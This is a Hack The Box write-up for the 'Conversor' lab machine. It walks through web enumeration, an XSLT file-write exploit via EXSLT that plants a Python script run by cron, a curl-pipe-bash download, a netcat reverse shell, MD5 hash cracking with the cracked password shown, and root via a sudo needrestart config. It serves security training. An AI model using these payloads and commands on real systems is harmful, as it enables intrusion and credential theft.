# Conversor — Hack The Box Writeup

**Platform:** Hack The Box
 **Machine:** Conversor
 **Difficulty:** Easy
 **Goal:** Obtain **user.txt** and **root.txt**

------

# Reconnaissance

I started by performing an initial scan using **Nmap** to identify open ports and running services.

```
nmap -T4 -A -v 10.129.xx.xx
```

## Scan Results

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh
80/tcp    open  http    Apache/2.4.52 (Ubuntu)

| http-title: Login
| Requested resource was /login
```

### Observations

- **Port 22** → SSH
- **Port 80** → Web server (Apache)
- The web server redirects to `/login`.

------

# Enumeration

Next, I performed directory enumeration using **dirsearch**.

```
dirsearch -u http://conversor.htb -t 40
```

## Discovered Paths

```
/about
/login
/register
/server-status (403)
/javascript
```

### Web Application

After visiting:

```
http://conversor.htb
```

I was redirected to:

```
http://conversor.htb/login
```

I created a new account using the **register** page and logged into the application.

------

# Application Functionality

After logging in, I noticed that the application allows uploading **two files**:

- `.xml`
- `.xslt`

The server converts them into **HTML output**.

This suggested a possible **XSLT processing vulnerability**.

------

# Identifying the XSLT Engine

I tested a simple XSLT payload to identify the processor being used.

```
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:output method="html"/>

<xsl:template match="/">
<h2>Detecting the underlying XSLT engine ...</h2>

<b>Version:</b>
<xsl:value-of select="system-property('xsl:version')"/><br/>

<b>Vendor:</b>
<xsl:value-of select="system-property('xsl:vendor')"/><br/>

<b>Vendor URL:</b>
<xsl:value-of select="system-property('xsl:vendor-url')"/><br/>

</xsl:template>

</xsl:stylesheet>
```

### Result

```
Version: 1.0
Vendor: libxslt
Vendor URL: http://xmlsoft.org/XSLT/
```

The application uses the **libxslt engine**, which supports **EXSLT extensions** that may allow file writing.

------

# Source Code Discovery

Checking the `/about` page revealed some useful information in the source code.

```
DB_PATH = '/var/www/conversor.htb/instance/users.db'
```

Another important configuration:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py;
do python3 "$f"; done
```

### Important Observation

- A **cron job runs every minute**
- It executes **any Python script inside**:

```
/var/www/conversor.htb/scripts/
```

This means if we can **write a Python file to that directory**, we can get **code execution**.

------

# Exploitation — Writing a Python Script

Using the **EXSLT document function**, we can write arbitrary files.

### Reverse Shell Script

First, create a reverse shell script on the your  machine.

```
shell.sh
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

Start a listener:

```
nc -lvnp <PORT>
```

------

### Malicious XSLT Payload

```
<?xml version="1.0" encoding="UTF-8"?>

<xsl:stylesheet
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:exploit="http://exslt.org/common"
extension-element-prefixes="exploit"
version="1.0">

<xsl:template match="/">

<exploit:document
href="/var/www/conversor.htb/scripts/shell.py"
method="text">

<xsl:text>
import os
os.system('curl http://<your_ip>:8000/shell.sh | bash')
</xsl:text>

</exploit:document>

</xsl:template>

</xsl:stylesheet>
```

### What this does

1. Creates a Python script:

```
/var/www/conversor.htb/scripts/shell.py
```

1. The cron job executes it automatically.
2. The script downloads and runs our **reverse shell**.

After uploading the payload and triggering the conversion, we receive a shell as:

```
www-data
```

------

# Credential Extraction

I found a database file:

```
/var/www/conversor.htb/instance/users.db
```

Inside it was a **MD5 password hash**:

```
5b5c3ac3a1c897c94caad48e6c71fdec
```

------

# Hash Cracking

Using **rockyou.txt**:

```
/usr/share/wordlists/rockyou.txt
```

crack it with my tool:

==================================================
```
القائمة الرئيسية
==================================================

[1] اختراق هاش واحد
[2] عرض أنواع الهاشات
[3] التعرف على نوع الهاش
[4] توليد قاموس كلمات
[5] خروج

اختيارك [1-5]: 1       

==================================================

 هاش واحد
==================================================

أدخل الهاش: 5b5c3ac3a1c897c94caad48e6c71fdec
[+] النوع المحتمل: MD5
استخدم هذا النوع؟ (y/n/تغيير): y
مسار ملف القاموس: /xx/xx/xx/xx/xx/rockyou.txt

[*] بدء هجوم القاموس
[*] نوع الهاش: MD5
[+] تم قراءة الملف بترميز: utf-8
[*] عدد الكلمات: 14,344,374
[*] التقدم: 73.7% | 10,565,675/14,344,374 | سرعة: 1320709/ثانية

[+] ✓ تم العثور على كلمة المرور!
[+] كلمة المرور: Keepmesafeandwarm
[+] المحاولات: 10,973,376
[+] الوقت: 8.31 ثانية


```

The password was cracked:

```
Keepmesafeandwarm
```

------

# SSH Access

I used the credentials to login via SSH.

```
ssh fismathack@conversor.htb
```

Password:

```
Keepmesafeandwarm
```

Now I obtained:

```
user.txt
```

------

# Privilege Escalation

Checking sudo permissions:

```
sudo -l
```

Output showed we can run:

```
/usr/sbin/needrestart
```

as **root**.

This tool is **needrestart**.

------

# Exploiting needrestart

The tool allows specifying a configuration file.

Create a malicious config:

```
echo 'exe "/bin/sh";' > /tmp/exp.conf
```

Execute:

```
sudo /usr/sbin/needrestart -c /tmp/exp.conf
```

This spawns a **root shell**.

------

# Root Flag

Finally, retrieve:

```
/root/root.txt
```